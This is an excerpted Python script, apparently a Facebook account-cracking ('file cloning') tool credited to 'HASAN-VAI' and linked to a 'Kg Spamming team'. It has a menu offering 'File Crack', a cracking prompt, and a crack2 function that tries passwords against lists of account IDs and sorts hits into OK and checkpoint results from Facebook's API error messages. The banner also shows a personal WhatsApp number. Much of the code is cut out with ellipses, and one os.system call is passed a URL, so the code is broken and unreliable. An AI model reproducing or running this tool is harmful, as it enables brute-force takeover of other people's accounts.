...
def banner():
	...
	print("""%s\n\x1b[93;1m
               ...
               \033[1;91m HASAN\033[1;92m FILE \033[1;93mCLONING
...
\033[1;92m ##     ## ##     ##  ######  ##     ## ##    ## 
          ...
          \033[1;92m FOLLOW \033[1;93m MY \033[1;94m FACEBOOK \033[1;96m ACCOUNT                

                      
 \x1b[92;1m===================================>\x1b[92;1m
 \x1b[93;1m Author      \x1b[92;1m=> \x1b[91;1mHASAN-VAI
 \x1b[93;1m Whatsapp    \x1b[92;1m=> \x1b[93;1m+8801996636652
 \x1b[93;1m Fb Group    \x1b[92;1m=> \x1b[94;1mKg Spamming team 
 \x1b[92;1m===================================>\x1b[92;1m
"""%(h))
...
def menu(): #Bilo
	...
	print("""%s \33[1;33m[1]\033[1;92m File Crack  """%(h))
	print("""%s \33[1;33m[0]\033[1;91m Exit"""%(h))
	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
	...
	if farhan in ['1','01']:
		...
		os.system("https://www.facebook.com/copy.link.erorr404")
		exit()
...
def passwrd():
	...
	print(x+'   \033[1;91mIF NO RESULT USE AIRPLANE MODE\n   \033[1;94mCracking Starting Bro...')
	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s [HASAN] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [HASAN-CP] %s|%s        '%(b,idf,pw))
